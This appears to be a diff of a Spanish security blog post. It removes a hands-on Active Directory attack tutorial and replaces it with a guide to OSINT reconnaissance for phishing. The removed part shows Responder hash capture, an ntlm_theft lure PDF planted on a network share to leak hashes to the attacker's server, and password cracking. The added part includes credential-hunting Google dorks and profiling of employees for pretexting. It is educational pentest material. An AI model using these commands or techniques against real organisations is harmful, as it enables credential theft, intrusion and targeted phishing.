@@ -13,16 +13,12 @@
     
     <meta name="twitter:card" content="summary"/>
 <meta name="twitter:title" content="Phising &amp; Recon De Una Organizacion"/>
-<meta name="twitter:description" content="La intención de este artículo mal redactado no es más que meramente educativa, no me responsabilizo del mal uso que le den. Sin embargo del lado de las compañías podrán entender como un atacante puede enumerar, reconocer y explotar protocolos comunes de autenticación para en etapas posteriores comprometer todo un dominio.
- Top Ataques comunes (AD en LAN) &#43; Mitigaciones   Reconocimiento inicial
-  Enumeración
-  Smbrelay Clásico"/>
+<meta name="twitter:description" content="Phising &amp; Remote Recon ¿Qué es el phishing? El Phishing es un término informático que distingue a un conjunto de técnicas que persiguen el engaño a una víctima ganándose su confianza haciéndose pasar por una persona, empresa o servicio de confianza, para manipularla y hacer que realice acciones que no debería realizar.
+A veces nos preguntamos como las personas recopilan información acerca de personas, servicios, o corporaciones con fines maliciosos&hellip; en este pequeño articulo procede a detallar cuales son las herramientas y técnicas que los &lsquo;malos&rsquo; utilizan en esta técnica tan eficiente a dias de hoy."/>
 
     <meta property="og:title" content="Phising &amp; Recon De Una Organizacion" />
-<meta property="og:description" content="La intención de este artículo mal redactado no es más que meramente educativa, no me responsabilizo del mal uso que le den. Sin embargo del lado de las compañías podrán entender como un atacante puede enumerar, reconocer y explotar protocolos comunes de autenticación para en etapas posteriores comprometer todo un dominio.
- Top Ataques comunes (AD en LAN) &#43; Mitigaciones   Reconocimiento inicial
-  Enumeración
-  Smbrelay Clásico" />
+<meta property="og:description" content="Phising &amp; Remote Recon ¿Qué es el phishing? El Phishing es un término informático que distingue a un conjunto de técnicas que persiguen el engaño a una víctima ganándose su confianza haciéndose pasar por una persona, empresa o servicio de confianza, para manipularla y hacer que realice acciones que no debería realizar.
+A veces nos preguntamos como las personas recopilan información acerca de personas, servicios, o corporaciones con fines maliciosos&hellip; en este pequeño articulo procede a detallar cuales son las herramientas y técnicas que los &lsquo;malos&rsquo; utilizan en esta técnica tan eficiente a dias de hoy." />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="https://0xl3mon.github.io/posts/phising-recon-de-una-organizacion/" />
 <meta property="article:published_time" content="2022-04-01T20:35:12+02:00" />
@@ -85,463 +81,537 @@
       </div>
     </header>
     <div class="post-content">
-      <blockquote>
-<p>La intención de este artículo mal redactado no es más que meramente educativa, no me responsabilizo del mal uso que le den. Sin embargo del lado de las compañías podrán entender como un atacante puede enumerar, reconocer y explotar protocolos comunes de autenticación para en etapas posteriores comprometer todo un dominio.</p>
-</blockquote>
-<h2 id="top-ataques-comunes-ad-en-lan--mitigaciones">Top Ataques comunes (AD en LAN) + Mitigaciones</h2>
+      <h1 id="phising--remote-recon">Phising &amp; Remote Recon</h1>
+<p><img src="https://latam.kaspersky.com/content/es-mx/images/repository/isc/2017-images/spam-phishing-img-02.jpg" alt=""></p>
+<h2 id="qué-es-el-phishing">¿Qué es el phishing?</h2>
+<p>El Phishing es un término informático que distingue a un conjunto de técnicas que persiguen el engaño a una víctima ganándose su confianza haciéndose pasar por una persona, empresa o servicio de confianza, para manipularla y hacer que realice acciones que no debería realizar.</p>
+<p>A veces nos preguntamos como las personas recopilan información acerca de personas, servicios, o corporaciones con fines maliciosos&hellip; en este pequeño articulo procede a detallar cuales son las herramientas y técnicas que los &lsquo;malos&rsquo; utilizan en esta técnica tan eficiente a dias de hoy.</p>
+<h2 id="para-que-sirve">Para que sirve</h2>
+<p>El phising es la actividad de compromiso más común y las características más comunes del phising es :</p>
+<p>• El vector de ataque &ldquo;clásico&rdquo;</p>
+<p>• Utilizado para repartir malware por correo electrónico.</p>
+<p>• Todavía se utiliza en campañas de fraude y entregas Payloads.</p>
+<h2 id="information-gathering---recon">Information Gathering - Recon</h2>
+<p>A continuación armaremos una pequeña lista de los temas que tocaremos</p>
 <ul>
 <li>
-<p>Reconocimiento inicial</p>
+<p><strong>Motores de búsquedas</strong> : <code>Google, Bing </code> -&gt; Un poco de dorking</p>
 </li>
 <li>
-<p>Enumeración</p>
+<p><strong>Reconocimiento</strong></p>
 </li>
 <li>
-<p>Smbrelay Clásico</p>
+<p><strong>Dns/whois, Dig</strong> -&gt; Enumeración de dominios</p>
 </li>
 <li>
-<p>Smbrelay + Ntlmteft</p>
+<p><strong>Shodan</strong> -&gt; Reconocimiento de Servicios</p>
 </li>
 <li>
-<p>Cracking de Hashes Ntlmv2</p>
+<p><strong>Dumpster</strong> -&gt; Reconocimiento de Dns y subdominios</p>
 </li>
 <li>
-<p>Pass The Hash</p>
+<p><strong>Hunter.io</strong> -&gt; Reconocimiento de Emails e información de contacto</p>
 </li>
 <li>
-<p>Mitm6 +  Ntlmrelay + Nishang</p>
-</li>
-<li>
-<p>Mitm6 + Ntlmrelay + Socks</p>
-</li>
-<li>
-<p>Mitigaciones</p>
+<p><strong>Redes sociales</strong> -&gt; Información útil para etapas posteriores de phising</p>
 </li>
 </ul>
-<h3 id="reconocimiento">Reconocimiento</h3>
-<p>En este artículo rasparemos un poco sobre distintas metodologías a la hora de enumerar activos en una red, y a su posterior etapa de explotación. El objetivo será una guía práctica sobre los vectores de ataque más comunes en las auditorias de red con acceso a la LAN, le aconsejo investigar o al menos entender por arriba sobre cómo funcionan los distintos mecanismos o protocolos de autenticación de Windows .</p>
-<p><strong>Ping</strong></p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">
-ping -c <span style="color:#ae81ff">2</span> 10.10.124.125
-
-</code></pre></div><p>Lo que hacemos con la utilidad <code>ping</code>  es básicamente enviar un paquete <strong>ICMP</strong> del tipo <code>echo request</code> para comprobar el estado de comunicación entre nuestro equipo y el host de destino, es decir si el host esta activo nos devolverá la petición ICMP con un <code>echo reply</code>.</p>
-<p>Aunque con esto no quiero decir que en el caso de que un servidor no nos devuelva la petición el host este apagado, si no que a lo mejor se establecieron reglas de firewall para bloquear ese tipo de solicitudes ICMP con el fin de evitar la enumeración de equipos activos.</p>
-<h4 id="un-poco-de-nmap">Un poco de Nmap</h4>
-<p>Como primera medida primero sera comprobaremos los equipos que nos reponden dentro de un segmento de red y reconocer la infraestructura de red con el uso de herramientas como  <strong>Nmap</strong>, <strong>Crackmapexec</strong>, <strong>Masscan</strong>, <strong>Rustscan</strong></p>
-<p><img src="https://i.imgur.com/VfyH9TN.png" alt=""></p>
-<p> <strong>nmap</strong> tiene extensas funcionalidades no sólo para descubrimiento. Sí no que si a eso le sumas su motor de scripts <strong>NSE</strong>, donde puedes agregar funcionalidades extras, generalmente estos scripts extensibles estan programados en  <strong>lua</strong> , es decir  <strong>nmap</strong> nos puede servir para <strong>recon</strong>, <strong>enumeración</strong> e inclusive <strong>explotación</strong>.</p>
-<p>a continuación mostraremos unos ejemplos interesantes con las siguientes opciones.</p>
+<h3 id="google-dorking">Google Dorking</h3>
+<p>Google dorking es una técnica para realizar búsquedas más precisas e ignorar resultados que no nos interesan del todo, para eso debemos hacer uso de parámetros de búsquedas como:</p>
+<p><a href="https://gist.github.com/sundowndev/283efaddbcf896ab405488330d1bbc06">Google Dork Cheatsheet</a></p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">
---packet-trace: flag para mostrar un sumario de cada paquete que se envía y se recibe.
+#(Buscamos tipo de fichero, sitio, texto)
 
--sP : nos sirve para sondear la red (envía paquetes echo reply ICMP, y espera su respuesta).
+site:packetstormsecurity.com filetype:pdf intext:buffer overflow
 
--n : Para que no haga una resolución DNS es decir, que no convierta el ip a nombre de dominio a través de una consulta DNS
+#(Files xls)
 
-</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">
-nmap -n -sP 10.10.124.155 --packet-trace
+filetype:xls &#34;Precios de casas&#34; and &#34;Rosario, Argentina&#34;
 
-</code></pre></div><p><img src="https://i.imgur.com/7g00QPd.png" alt="">
-<strong>Probando Distintos modos de escaneo con Nmap</strong> :</p>
-<ul>
-<li><strong>SYN</strong> (Sigiloso y eficiente)</li>
-</ul>
+#(Any Doc file what contain &#34;Security plan of the site gov.in&#34;)
+
+filetype:doc “security plan” site:gov.in
+
+# Admins credentials
+
+intext:company_keyword &amp; ext:txt | ext:sql | ext:cnf | ext:config | ext:log &amp; intext:&#34;admin&#34; | intext:&#34;root&#34; | intext:&#34;administrator&#34; &amp; intext:&#34;password&#34; | intext:&#34;root&#34; | intext:&#34;admin&#34; | intext:&#34;administrator&#34;
+
+# Look for domains indexed by others website
+
+site:bgp.he.net inurl:ndd
+
+site:dnslookup.fr inurl:ndd
+
+# Get información on the internal organization
+
+sites:cadres.apec.fr direction &lt;SOCIETE&gt;
+
+</code></pre></div><h4 id="ejemplo-dorking">Ejemplo Dorking</h4>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">
+site:cisco.com -site:www.cisco.com
+
+site:newsroom.cisco.com -site:forums.cisco.com -site:blogs.cisco.com
+
+</code></pre></div><p>Con el operador <strong>&quot;-&quot;</strong> encontramos nombres de host interesantes y reducimos los sus resultados</p>
+<p><strong>Example II</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">
+Para ser más especifico :
+
+‐ excluimos el tipo de fichero con -ext (extensios, filetype)
+
+‐ site:argentina.gov -&gt; regresa 14.000 resultados
+
+‐ site:argentina.gov -ext:htm -ext:html -&gt; regresa 4000 resultados
+
+(Este dominio por razones obvias no existe, es a modo de ejemplo)
+
+</code></pre></div><p><strong>Example III</strong></p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">
-1. -sS : Un Scaneo sigiloso del tipo TCP/SYN , es un escaneo rápido y eficiente no es restringido por firewalls
+login | logon -&gt; Busca las páginas de inicio dentro de un sitio de destino
 
-2. -sT : Similar al escaneo TCP/SYN anterior con la diferencia de que este completa la conexion para después finalizarla
+username | userid | employee.ID -&gt; Busca posible información de credenciales
 
-</code></pre></div><p>para entender los siguientes tipos de escaneo miremos las imágenes presentadas a continuación</p>
-<ol>
-<li><strong>Escaneo sigiloso SYN</strong> : Es un tipo de escaneo que no completa su conexión envía el paquete <strong>SYN</strong>, recibe el <strong>SYN/ACK</strong> pero no responde con un <strong>ACK</strong> para completar el saludo de 3 vías <strong>(3 way handshake)</strong> si no que envía un paquete <strong>RST</strong> para decirle que hubo un error y que reinicie la conexión (Cancela la conexión).</li>
-</ol>
-<p><img src="https://i.imgur.com/uS4h1u5.png" alt=""></p>
-<p>En  caso de que el escaneo <strong>SYN</strong> no sea efectivo, tiraremos de un escaneo <strong>TCP</strong></p>
-<ol start="2">
-<li><strong>Escaneo TCP</strong> a diferencia del escaneo anterior completamos la conexión con nuestro paquete <strong>ACK</strong> es decir enviamos nuestro paquete <strong>SYN</strong>, el servidor nos responde con un <strong>SYN/ACK</strong> , le devolvemos el <strong>ACK</strong> (completando el 3 way handshake) y le respondemos con UN <strong>RST</strong> para que finalice la conexión o la reinicie</li>
-</ol>
-<p><img src="https://i.imgur.com/ZCmcoAT.png" alt=""></p>
-<blockquote>
-<p>Flags de paquetes en TCP DUMP
-[S] : SYN (Iniciar Conexión)
-[S.] : SYN/ACK (confirmación de SYN recibido)
-[.] : ACK (Confirmado)
-[R.] : RST (Resetear la conexcion)</p>
-</blockquote>
-<p>A continuacion comprobaremos los puertos abiertos de un host, especificándo en <strong>nmap</strong>  las siguientes opciones :</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">
--sS : TCP SYN <span style="color:#f92672">(</span>sigiloso<span style="color:#f92672">)</span>
+password | passcode | “your password is” -&gt; Puede ayudar a encontrar credenciales (bastante raro) mas amenudo regresa paginas que ayudan a recuperar contraseñas a los usuarios
 
---min-paralelism : especifica el número mínimo de operaciones de escaneo de puertos paralelos en resumen <span style="color:#f92672">(</span>dividir el proceso de escaneo en partes más pequeñas y sea algo mas eficiente<span style="color:#f92672">)</span>
+admin | administrator -&gt; Paginas de administración de la aplicacion
 
---max-rtt-timeout :  se utiliza para especificar el tiempo de espera máximo de RTT <span style="color:#f92672">(</span>tiempo de ida y vuelta<span style="color:#f92672">)</span> para una respuesta de paquete
+intranet | help.desk -&gt; Puede localizar información de contacto de una mesa de ayuda, util para ejercisios de phising y pretecto... asi como portales de inicio de sesión
 
--p- : Todos los puertos, parecido a -p 1-65535 en rango de enteros
+</code></pre></div><p><img src="https://i.imgur.com/wFGdvdY.png" alt=""></p>
+<p>El uso de operadores negativos como &ldquo;-ext:&rdquo; puede ayudar a reducir los resultados nuevamente, acercándole a lo que está</p>
+<p>buscando.</p>
+<p><strong>&quot;-Ext&quot;</strong> eliminará páginas e información de las consultas de Google con extensiones específicas.</p>
+<p><img src="https://i.imgur.com/TnwAWpw.png" alt=""></p>
+<h4 id="recomiendo-google-hacking-database-de-exploit-db">Recomiendo google hacking database de exploit DB</h4>
+<p>Para profundizar y aprender mas sobre google hacking</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">
+https://www.exploit-db.com/google-hacking-database
 
---open : Con estado open/abierto
+</code></pre></div><h3 id="shodan">Shodan</h3>
+<p>Shodan es un motor de búsqueda para dispositivos conectados a Internet. Los malos suelen utilizarlo para buscar servicios o aplicaciones vulnerables, pero más allá de eso es una herramienta muy poderosa a la hora de enumerar , con <strong>shodan</strong> también podemos elaborar consultas de búsqueda e incluir filtros como los siguientes</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">
+- net: Especificamos Bloque de ip CIDR
 
--n : No haga resolución DNS
+- city: Ciudad donde se encuentra el target
 
--Pn : No haga descubrimiento ICMP, osea no envié el paquete ECHO REQUEST y se quede esperando su respuesta ECHO REPLY
+- country: País donde se encuentra el target
 
-</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">
-nmap -sS --min-parallelism <span style="color:#ae81ff">1000</span> --max-rtt-timeout 100ms -p- --open 10.10.124.155 -n -Pn -vvv
+- port: Puerto de servicio
 
-</code></pre></div><p><img src="https://i.imgur.com/XCLbxJB.png" alt=""></p>
-<h4 id="rustscan">Rustscan</h4>
-<p><strong>Enumeración Básica con Rustscan</strong></p>
-<p>Scanner para mapear redes escrito en <strong>RUST</strong>  bastante rapido (<strong>Nmap</strong> puede ser igual de rapido si jugamos con las opciones correctas), para usarlo como complemento de nmap está bastante bien, ya que puedes usar uno para descubrimiento y el otro para enumeracion de servicios de puertos abiertos ejemplo:</p>
-<pre><code>
-rustscan -a 10.10.124.132 --ulimite 5000 -- -n -Pn
+- before: Posted before a certain data
 
-</code></pre><p><img src="https://i.imgur.com/RHAedzt.png" alt="" title="Rustscan"></p>
-<h4 id="crackmapexec">Crackmapexec</h4>
-<p>La <strong>navaja suiza</strong> del pentesting, escrita en python sirve tanto para enumeración también como para postexplotacion, utiliza librerias de impackets en su suite, soporta distintos protocolos como <strong>mssql, ssh, winrm, ldap, smb</strong>con ella la creatividad juega un rol importante.</p>
-<p>Podemos hacer un sin fin de cosas desde fuerza bruta a ofuscar scripts en powershell, utilizar archivos customs de AMSI bypass, subir, ejecutar , dumpear hashes etc.
-Inclusive Lo podemos utilizar para movimiento lateral con pass the hash una <strong>Navaja Suiza</strong> literal</p>
+- after: posted after a certain date
+
+- os: Sistema operativo en uso
+
+</code></pre></div><p><img src="https://i.imgur.com/MtPEjzj.png" alt=""></p>
+<h3 id="whois">Whois</h3>
+<p>Es un protocolo TCP basado en petición/respuesta que se emplea para realizar consultas en una base de datos, permitiendo <strong>identificar al propietario</strong> de un nombre de dominio o una dirección IP en Internet.</p>
 <ul>
-<li><strong>Recon Básica Crackmapexec</strong></li>
+<li>
+<p><strong>Podemos identificar bloques de ip CIDR</strong></p>
+</li>
+<li>
+<p>información de contactos.</p>
+</li>
 </ul>
-<p>Mapeando la red de un dominio para listar información interesante .</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">
-cme -t <span style="color:#ae81ff">200</span> smb 10.10.124.0./24 --gen-relay-list NotSmbSigning.txt
-
-</code></pre></div><p><img src="https://i.imgur.com/wD0BuJS.png" alt=""></p>
+<p>‐ <strong>NS</strong>: Nameserver(servidor de nombres) records</p>
+<p>los registros <strong>NS</strong> delegan la zona DNS para usar los servidores de nombres autorizados dados</p>
+<p>‐ <strong>A</strong>: Address records</p>
+<p>El registro <strong>A</strong> se utiliza para una resolución de DNS directo. En resumen, el registro <strong>A</strong> apunta su dominio a su servidor</p>
+<p>‐ <strong>MX</strong>: Mail Exchange records</p>
+<p>(MX) de DNS dirige el correo electrónico a un servidor de correo</p>
+<p>‐ <strong>PTR</strong>: Pointers, inverse lookup record</p>
+<p>Resuelve las direcciones ip en nombre s dominio, crea una zona de dns inversa</p>
+<p><img src="https://i.imgur.com/5YN8i7v.png" alt=""></p>
+<h3 id="reconocimiento-con-fuentes-públicas-de-una-organización">Reconocimiento Con Fuentes públicas de una organización</h3>
+<p>Hay numerosos sitios publicos que pueden brindarle información acerca de una organización o compañía.</p>
 <ul>
-<li><strong>Listar Módulos con crackmapexec</strong></li>
+<li>
+<p><strong>Rocket Reach</strong> : buscador de emails, números de teléfono e información de contacto</p>
+</li>
+<li>
+<p><strong>Zoominfo</strong> : vende acceso a su base de datos de información sobre empresarios y empresas a profesionales de ventas</p>
+</li>
+<li>
+<p>Registro Nacional de personas, sitios públicos del gobierno/estado donde consultar información</p>
+</li>
+<li>
+<p>información de contacto en los sitios webs de la organización - donde encontramos nombres, teléfono y emails</p>
+</li>
 </ul>
-<p>Como vemos en la imagen a continuación hay toda una sección de módulos de post explotacion, inclusive <strong>ADCS</strong> una vulnerabilidad reciente de Servicios de certificados de Active Directory en un dominio y más  como por ejemplo podemos lograr ejecutar un ingestor de <strong>Bloodhound</strong> para recopilar información de todo el dominio, este paso nos ahorra bastante tiempo y nos evita andar jugando con la red e ir directamente a donde queremos llegar.</p>
-<p><img src="https://i.imgur.com/p0RZds2.png" alt=""></p>
+<h3 id="redes-sociales">Redes sociales</h3>
+<p>Las redes sociales son las más fructíferas, ya que en ella se dejan demasiada información útil para etapas posteriores a la hora de realizar algún tipo de ataque de ingeniería social lo más común es encontrar.</p>
 <ul>
-<li><strong>Enumeración básica con crackmapexec</strong></li>
+<li>
+<p>Ubicación</p>
+</li>
+<li>
+<p>Empleo</p>
+</li>
+<li>
+<p>Información de contacto</p>
+</li>
+<li>
+<p>Hobbies e intereses</p>
+</li>
+<li>
+<p>Información de la familia</p>
+</li>
 </ul>
-<p>Ejemplo de enumeración básica con un usuario con bajos privilegios</p>
-<pre><code>
-cme -t 200 smb 10.10.124.0/24 -u Consultant -p Password123! -d child.evilcorp.local --shares --session --loggedon-users --local-groups
-
-</code></pre><p><img src="https://i.imgur.com/8Hl5P6O.png" alt=""></p>
-<p>Logramos enumerar sesiones, recursos compartidos , y algunos grupos locales.</p>
-<p>Esto es un pequeño ejemplo de todo lo que puede hacer con <strong>CRACKMAPEXEC</strong> incluyendo que tambien puede lograr <strong>Remote Code Execution</strong> con distintos métodos como <strong>wmiexec</strong>, <strong>atexec</strong>, <strong>smbexec</strong>, <strong>mmcexec</strong>, <strong>winrm</strong> lo invito a que juegue un poco con él.</p>
+<h3 id="dnsquery">DNSquery</h3>
+<p>Es una sitio para reconocimientos de redes online bastante útil ya que usted puede realizar distintos tipos enumeraciones</p>
+<p>DNSQUERY no es una herramienta en profundidad, sino que puede hacer un reconocimiento básico de red simple y básica para sitios y servicios en línea.</p>
+<p><img src="https://i.imgur.com/BoQ3HRx.png" alt=""></p>
+<h4 id="brecha-de-datos-si-es-que-identificamos-correos">Brecha de datos si es que identificamos correos</h4>
 <ul>
-<li><strong>RCE</strong> Información útil a tener en cuenta a la hora de querer ejecutar comandos con cuentas privilegiadas</li>
+<li>
+<p><a href="https://www.dehashed.com/">Dehashed</a></p>
+</li>
+<li>
+<p><a href="https://haveibeenpwned.com/">HaveIBeenPwned</a></p>
+</li>
+<li>
+<p><a href="https://intelx.io/">Intelx.io</a> <strong>Osint + identifica brechas de datos</strong></p>
+</li>
 </ul>
-<table>
-<thead>
-<tr>
-<th>Metodo </th>
-<th>Tipo de RCE   </th>
-<th>Puertos usados          </th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>Wmiexec</td>
-<td>Cmd/Powershell</td>
-<td>TCP:(135, 445, 50911)   </td>
-</tr>
-<tr>
-<td>Atexec  </td>
-<td>Cmd/Powershell</td>
-<td>TCP: 445                </td>
-</tr>
-<tr>
-<td>Smbexec</td>
-<td>Cmd/Powershell</td>
-<td>TCP: 445                </td>
-</tr>
-<tr>
-<td>Mmcexec</td>
-<td>Cmd/Powershell</td>
-<td>TCP:(135,445,49751 DCOM)</td>
-</tr>
-<tr>
-<td>winrm  </td>
-<td>Cmd/Powershell</td>
-<td>TCP:(5985, 5986)        </td>
-</tr>
-</tbody>
-</table>
+<h4 id="busquedas-de-osint">Busquedas de OSINT</h4>
+<ul>
+<li>
+<p><strong>SpiderFoot</strong> [https://github.com/smicallef/spiderfoot]</p>
+</li>
+<li>
+<p><a href="https://osintframework.com/">OsintFrameWork</a></p>
+</li>
+<li>
+<p><a href="https://www.namecheckr.com/">NameCheckr</a> - Enumerar desde un email a cuentas en distintas plataformas</p>
+</li>
+</ul>
+<p><strong>Creepy</strong></p>
+<p><a href="http://www.geocreepy.com/">Cree.py</a> es una herramienta de geolocalización bastante útil</p>
 <hr>
-<h2 id="smb-relay-clásico-ipv4">Smb Relay Clásico IPV4</h2>
-<h4 id="responder">Responder</h4>
-<p>Responder es un envenenador de tráfico y sniffer que hace de Man in the Midle envenenando trafico de distintos protocolos como :</p>
-<ul>
-<li><strong>NBT-NS</strong></li>
-<li><strong>LLMNR</strong></li>
-<li><strong>NTLM</strong></li>
-<li><strong>SMB</strong></li>
-<li><strong>MSSQl</strong></li>
-</ul>
-<p><strong>LLMNR/NBT-NS</strong>: Se utiliza como alternativa de resolución de nombres cuando el DNS no está funcionando correctamente.
-<strong>NTLM</strong> : Protocolo de autenticación utilizado conmunmente en sistemas windows utiliza el procedimiento de <strong>desafio/respuesta</strong>
-<strong>SMB</strong> :  Protocolo de red que se utiliza para compartir archivos, impresoras entre nodos de una red
-<strong>MSSQL</strong> : Protocolo utilizado en servidores SQL</p>
-<h5 id="breve-explicacion-de-autenticacion-con-ntlm"><strong>Breve explicacion de autenticacion con NTLM</strong></h5>
-<ol>
-<li>El cliente envía un <strong>nombre de usuario</strong> al <em>host</em>.</li>
-<li>El <em>host</em> responde con un <strong>número aleatorio</strong>, para que el cliente realize el desafío.</li>
-<li>El cliente crea un <strong>valor <em>hash</em></strong> a partir de el número brindado y la contraseña del usuario y lo devuelve como respuesta.</li>
-<li>Del mismo modo, el <em>host</em>, que también conoce la contraseña, crea el valor <em>hash</em> y, a continuación, lo <strong>compara con la respuesta del cliente</strong>.</li>
-<li>Si <strong>ambos valores coinciden</strong>, se confirma la autenticidad del cliente y se permite el acceso. Si no hay coincidencia, se cancela la conexión.</li>
-</ol>
-<p><img src="https://i.imgur.com/eUdlqgw.png" alt=""></p>
-<p><strong>Responder</strong>
-A continuación utilizaremos responder y capturaremos algunos hashes, explicando por que sucede tal situacion.</p>
-<p>Primero el responder lo que hace es montar un servidor con distintos protocolos  para que cuando algun activo de la red a la hora de buscar un recurso que no lo encuentre, ek Responder , esencialmente dira &quot; <em>sí, soy yo pero primero autenticate contra mi&quot;</em> y es ahi en ese momento donde el cliente expone sus hashes para la autenticación.
-<img src="https://i.imgur.com/hRTz3tJ.png" alt=""></p>
-<h4 id="crackeando-el-hash-netntlmv2-capturado">Crackeando el hash <strong>netntlmv2</strong> capturado</h4>
-<ol>
-<li>
-<p>Identificamos el tipo de hash</p>
-</li>
-<li>
-<p>le indicamos a <strong>john</strong> el formato del hash y el diccionario</p>
-</li>
-<li>
-<p>crackeamos el hash</p>
-</li>
-</ol>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">
-cat &gt; hash
-
-hashid -j hash
-
-john --format<span style="color:#f92672">=</span>netntlmv2 --wordlist<span style="color:#f92672">=</span>/usr/share/wordlists/rockyou.txt hash
-
-john hash --show
-
-</code></pre></div><p><img src="https://i.imgur.com/MOFz1mA.png" alt=""></p>
-<h4 id="capturando-hashes-con-ntlm_theft--smbrelay">Capturando Hashes con ntlm_theft + Smbrelay</h4>
-<p>Conseguir credenciales de acceso válidas en la mayoría de los casos es fundamental para continuar con etapas posteriores de post explotación, en este caso realizaremos una pequeña prueba de con la herramienta <strong>ntlm_theft</strong> que básicamente lo que hace es generar un témplate de un fichero apuntando hacia nuestro servidor con el responder (donde estaremos envenenando la red) para capturar hashes. En este caso lo que haremos será</p>
-<ol>
-<li>
-<p>Crear el fichero malicioso para subirlo a un recurso de la red</p>
-</li>
-<li>
-<p>Subir ese fichero con smbmap/crackmapexec (ya que disponemos de credenciales de bajo privilegio)</p>
-</li>
-<li>
-<p>Ejecutar el responder para que este en escucha envenenando las conexiones para extraer hashes cuando se autentican contra nosotros.</p>
-</li>
-<li>
-<p>Esperar a que el usuario victima haga clic en el recurso y su tráfico sea redirigido a nuestro servidor con el responder activo</p>
-</li>
-</ol>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">
-python3 ntlm_theft.py
-
-python3 ntlm_theft.py --server 10.10.124.240 --generate pdf -f cheque_a_cobrar.pdf
-
-</code></pre></div><p>-  Creacion del fichero con <strong>ntlm_theft</strong></p>
-<p><img src="https://i.imgur.com/gkNTOt3.png" alt=""></p>
+<h4 id="the-harvester">The Harvester</h4>
+<p>The harvester es una herramienta que realiza búsquedas en distintos motores de búsqueda como <strong>Google, LinkedIn, Bing, Shodan</strong> y otras fuentes también puede enumerar</p>
 <ul>
 <li>
-<p>Enumeramos la carpeta con permisos de escritura, para subir nuestro archivo malicioso.</p>
+<p>Informacion de de DNS</p>
 </li>
 <li>
-<p>Subimos el fichero con smbmap, ya que enumeramos anteriormente con crackmapexec y nos dimos cuenta que hay una carpeta con permisos de escritura.</p>
+<p>Personas</p>
+</li>
+<li>
+<p>Emails</p>
+</li>
+<li>
+<p>Servicios conocidos.</p>
 </li>
 </ul>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">
-smbmap -u consultant -p Password123<span style="color:#ae81ff">\!</span> -d child.evilcorp.local -H 10.10.124.155
-
-smbmap -u consultant -p Password123<span style="color:#ae81ff">\!</span> -d child.evilcorp.local -.H 10.10.124.155 -r SharedFolder$
-
-smbmap -u consultant -p Password123<span style="color:#ae81ff">\!</span> -d child.evilcorp.local -.H 10.10.124.155 -r SharedFolder$<span style="color:#ae81ff">\\</span>consultant
-
-smbmap -u consultant -p Password123<span style="color:#ae81ff">\!</span> -d child.evilcorp.local -.H 10.10.124.155 -r SharedFolder$<span style="color:#ae81ff">\\</span>consultant  --upload cheque_bancario.pdf
-
-SharedFolder<span style="color:#ae81ff">\$</span>/consultant/cheque_bancario.pdf
-
-</code></pre></div><p><img src="https://i.imgur.com/1F68Ocd.png" alt=""></p>
-<p> Una vez subido nuestro fichero malicioso creado con <strong>ntlm_theft</strong>, esperaremos a que alguien curioso quiera fijarse qué clase de cheque bancario es.</p>
-<p> <img src="https://i.imgur.com/mtLKzeE.png" alt=""></p>
-<p> Y en nuestro responder veremos que la persona que abrió nuestro pdf es una cuenta con privilegios de administrador, podríamos intentar crackearlo y con suerte nos hacemos con el dominio entero</p>
-<p> <img src="https://i.imgur.com/bWto63j.png" alt=""></p>
-<p> a continuación intentaremos ejecutar un comando remoto <code>whoami</code> a modo de prueba, para después terminar dumpeando la sam local o bien el ntds del dominio , para poder hacer <strong>pass the hash</strong>, aunque ya teniendo una cuenta privilegiada, podemos activar el módulo de RDP con crackmapexec o simplemente loguearnos por <strong>WINRM</strong> en el caso de que tenga el puerto 5987 y si no lo tiene abierto podemos habilitarlo quitando las reglas de firewall ya que tenemos ejecución remota de comando a través del smb.</p>
-<p> <img src="https://i.imgur.com/aEATcdm.png" alt=""></p>
-<h2 id="ntlm-relay">NTLM Relay</h2>
-<p><strong>NTLM</strong> es un protocolo de estilo de <code>desafío/respuesta</code>  como nombramos anteriormente que se usa en windows para la autenticación entre clientes y servidores.</p>
-<p>Los protocolos (que requieren autenticación de un usuario) y lo utilizan son  <strong>HTTP</strong>, <strong>SMB</strong>, <strong>SMTP</strong> . Es decir <strong>NTLM</strong> están integrado en ellos.</p>
-<p>El proceso que realiza NTLM para la autenticación es el siguiente :</p>
-<ol>
+<p><img src="https://i.imgur.com/0qGQYTl.png" alt=""></p>
+<p>Como ven es una fantástica herramienta de reconocimiento ya que en los resultados podemos identificar los cargos de empleados como de administración, recursos humanos, o ingenieros de softwares etc.</p>
